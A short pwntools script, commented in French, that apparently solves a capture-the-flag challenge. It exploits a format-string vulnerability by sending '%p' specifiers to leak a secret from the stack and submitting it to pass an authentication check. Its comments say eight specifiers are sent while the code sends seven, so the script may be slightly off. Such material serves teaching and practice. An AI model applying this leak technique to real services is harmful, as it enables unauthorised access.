#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=1)
context.terminal = ["tmux", "splitw", "-h"]

p = remote("ctf.example.org", 4401)

# on envoie 8 %p.
# les 5 premiers affichent le contenu des registres RSI, RDX, RCX, R8, R9
# a partir sur sixieme, ils affichent [RSP], [RSP+8], [RSP+16], [RSP+24], etc..
# on a vu sur gdb que 'secret' etait stocke a [RSP+8], donc sa valeur sera
# affichee par le 8eme %p !
p.sendlineafter(b"username: ", b"%p " * 7)
secret = p.recvline().split()[
    7
]  # on split en utilisant les espaces comme delim, pour secuperer le 8 eme mot
# on convertit notre leak en int en format signed:
secret = signed(int(secret, 16))
log.info(f"secret={secret}")
p.sendlineafter(b"secret: ", str(secret).encode())
p.interactive()
